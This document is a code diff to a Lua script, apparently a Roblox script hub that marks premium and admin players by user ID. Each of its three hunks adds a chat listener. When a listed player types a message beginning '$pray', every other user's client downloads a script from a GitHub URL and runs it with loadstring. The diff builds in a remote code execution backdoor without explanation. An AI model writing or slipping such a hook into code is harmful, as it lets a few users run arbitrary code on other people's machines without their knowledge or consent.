@@ -320,6 +320,13 @@ function premium()
 				end
 			end
 		end)
+		v.Chatted:connect(function(cht)
+		if cht:match("$pray .") then
+			if game.Players.LocalPlayer ~= v then
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
+			end
+		end
+	end)
 end
 		elseif StarId[v.UserId] then
 			if v.Character then
@@ -536,6 +543,13 @@ local freeze = function()
 				end
 			end
 		end)
+		v.Chatted:connect(function(cht)
+		if cht:match("$pray .") then
+			if game.Players.LocalPlayer ~= v then
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
+			end
+		end
+	end)
 end
 		elseif AdminId[v.UserId] then
 			if v.Character then
@@ -814,6 +828,13 @@ local freeze = function()
 				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🔥]'..v.DisplayName)
 								wait(1)
 								end
+			end
+		end
+	end)
+	v.Chatted:connect(function(cht)
+		if cht:match("$pray .") then
+			if game.Players.LocalPlayer ~= v then
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
 			end
 		end
 	end)
